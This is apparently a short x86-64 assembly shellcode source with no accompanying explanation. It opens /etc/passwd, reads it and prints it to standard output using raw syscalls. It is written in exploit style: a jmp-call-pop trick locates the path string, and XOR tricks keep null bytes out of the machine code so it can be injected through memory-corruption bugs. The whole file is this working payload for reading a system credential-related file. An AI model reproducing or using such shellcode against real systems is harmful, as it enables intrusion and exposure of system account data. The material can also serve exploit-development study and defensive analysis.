global _start

section .text

_start:
    jmp _push_filename

_readfile:
    ; open
    pop rdi                     ; pop path value
    xor byte [rdi + 11], 0x5a   ; add null byte to string

    xor eax, eax
    xor esi, esi                ; set O_RDONLY flag
    mov al, 2                   ; __NR_open = 2
    syscall

    ; read
    xor edx, edx
    mov dx, 0xffe               ; size to read
    sub rsp, rdx
    mov rsi, rsp
    mov rdi, rax
    sub eax, eax                ; __NR_read = 0
    syscall

    ; write to stdout
    xor edi, edi
    inc dil                     ; stdout fd = 1
    mov rdx, rax
    xor eax, eax
    inc al                      ; __NR_write = 1
    syscall

    ; exit
    sub eax, eax
    mov al, 60
    syscall

_push_filename:
    call _readfile
    path: db "/etc/passwdZ"
